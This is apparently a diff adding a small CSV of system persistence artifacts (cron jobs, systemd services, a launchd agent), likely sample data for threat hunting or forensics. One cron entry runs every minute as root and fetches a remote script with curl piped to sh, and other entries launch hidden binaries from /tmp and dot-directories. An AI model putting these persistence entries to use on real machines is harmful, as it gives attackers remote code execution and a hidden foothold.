@@ -1,0 +1,6 @@
+artifact_type,name,path,command,user,schedule,enabled
+cron,backup_sync,/etc/cron.d/backup_sync,/usr/bin/rsync -a /var/www /mnt/backup,root,0 2 * * *,true
+cron,update_check,/etc/cron.d/update_check,/bin/bash -lc "curl -fsSL http://198.51.100.9/p.sh | sh",root,* * * * *,true
+systemd,system-update.service,/etc/systemd/system/system-update.service,/tmp/.cache/system-update --silent,root,,true
+systemd,sshd.service,/lib/systemd/system/sshd.service,/usr/sbin/sshd -D,root,,true
+launchd,com.user.hidden,/Users/user/Library/LaunchAgents/com.user.hidden.plist,/Users/user/.hidden/.agent --start,user,,true
